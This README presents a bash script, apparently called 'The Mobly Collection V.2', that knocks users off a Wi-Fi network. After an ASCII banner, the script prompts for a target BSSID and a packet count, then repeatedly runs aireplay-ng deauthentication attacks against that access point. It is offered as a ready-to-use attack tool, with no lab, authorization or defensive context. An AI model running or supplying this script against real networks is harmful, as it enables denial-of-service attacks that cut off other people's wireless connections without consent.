# Deauthenticate Users from Network

```bash
sudo bash script.bash
```

## Features

- Useable on any Linux System with Aireplay.ng 
- No Bugs
- Simple to use
- Made by a pro

## Script's Code

```shell
#!/bin/bash
clear
echo -e '


$$$$$$$\                                         $$\     $$\       
$$  __$$\                                        $$ |    $$ |      
$$ |  $$ | $$$$$$\          $$$$$$\  $$\   $$\ $$$$$$\   $$$$$$$\  
$$ |  $$ |$$  __$$\ $$$$$$\ \____$$\ $$ |  $$ |\_$$  _|  $$  __$$\ 
$$ |  $$ |$$$$$$$$ |\______|$$$$$$$ |$$ |  $$ |  $$ |    $$ |  $$ |
$$ |  $$ |$$   ____|       $$  __$$ |$$ |  $$ |  $$ |$$\ $$ |  $$ |
$$$$$$$  |\$$$$$$$\        \$$$$$$$ |\$$$$$$  |  \$$$$  |$$ |  $$ |
\_______/  \_______|        \_______| \______/    \____/ \__|  \__|
                         The Mobly Collection V.2                                          
                                                                   '
                                                                                                                                        
echo "Enter BSSID" 
read ssid
echo "Deauth packets (suggest 5)"
read packet

clear
for i in {1..10}; do sudo aireplay-ng --deauth $packet -a $ssid wlan0 ; date ; sleep 5 ; done
```


